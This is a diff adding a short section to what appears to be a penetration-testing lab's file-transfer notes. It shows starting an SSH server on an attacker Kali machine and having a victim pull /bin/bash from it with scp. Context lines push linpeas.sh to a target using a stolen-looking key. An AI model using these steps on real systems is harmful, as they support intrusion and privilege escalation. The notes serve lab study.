@@ -32,6 +32,26 @@ scp -P 25022 -i id_rsa.txt /opt/linuxpriv/linpeas.sh alfredo@192.168.161.249:~
 ```
 
 
+### scp download from inside ssh
+
+start SSH server
+```
+sudo service ssh
+sudo service ssh start 
+```
+
+my ssh starts at 2222
+
+![[Pasted image 20240614011501.png]]
+
+in victim
+```
+scp -P 2222 kali@192.168.45.214:/bin/bash /home/tom/usr/bin
+```
+
+![[Pasted image 20240614011618.png]]
+
+
 -------
 
 ## **SMB File Sharing**
